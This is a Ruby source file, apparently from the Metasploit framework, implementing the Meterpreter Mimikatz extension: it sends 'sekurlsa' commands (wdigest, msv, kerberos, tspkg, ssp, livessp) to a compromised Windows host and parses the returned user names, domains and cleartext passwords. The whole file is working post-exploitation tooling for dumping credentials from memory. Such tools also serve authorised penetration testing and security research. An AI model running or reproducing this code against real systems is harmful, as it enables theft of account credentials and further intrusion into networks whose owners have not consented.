#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/mimikatz/tlv'
require 'csv'

module Rex
module Post
module Meterpreter
module Extensions
module Mimikatz

###
#
# Mimikatz extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by Ben Campbell (Meatballs)
###

class Mimikatz < Extension

  def initialize(client)
    super(client, 'mimikatz')

    client.register_extension_aliases(
      [
        {
          'name' => 'mimikatz',
          'ext'  => self
        },
      ])
  end

  def send_custom_command_raw(function, args=[])
    request = Packet.create_request('mimikatz_custom_command')
    request.add_tlv(TLV_TYPE_MIMIKATZ_FUNCTION, function)
    args.each do |a|
      request.add_tlv(TLV_TYPE_MIMIKATZ_ARGUMENT, a)
    end
    response = client.send_request(request)
    return response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT)
  end

  def send_custom_command(function, args=[])
    return Rex::Text.to_ascii(send_custom_command_raw(function, args))
  end

  def parse_creds_result(result)
    details = CSV.parse(result)
    accounts  =  []
    details.each do |acc|
      account = {
        :authid => acc[0],
        :package => acc[1],
        :user => acc[2],
        :domain => acc[3],
        :password => acc[4]
      }
      accounts << account
    end
    return accounts
  end

  def parse_ssp_result(result)
    details = CSV.parse(result)
    accounts = []
    details.each do |acc|
      ssps = acc[4].split(' }')
      ssps.each do |ssp|
        s_acc = ssp.split(' ; ')
        user = s_acc[0].split('{ ')[1]
        account = {
          :authid => acc[0],
          :package => acc[1],
          :user => user,
          :domain => s_acc[1],
          :password => s_acc[2],
          :orig_user => acc[2],
          :orig_domain => acc[3]
        }
        accounts << account
      end
    end
    return accounts
  end

  def wdigest
    result = send_custom_command('sekurlsa::wdigest')
    return parse_creds_result(result)
  end

  def msv
    result = send_custom_command('sekurlsa::msv')
    return parse_creds_result(result)
  end

  def livessp
    result = send_custom_command('sekurlsa::livessp')
    return parse_creds_result(result)
  end

  def ssp
    result = send_custom_command('sekurlsa::ssp')
    return parse_ssp_result(result)
  end

  def tspkg
    result = send_custom_command('sekurlsa::tspkg')
    return parse_creds_result(result)
  end

  def kerberos
    result = send_custom_command('sekurlsa::kerberos')
    return parse_creds_result(result)
  end
end

end; end; end; end; end

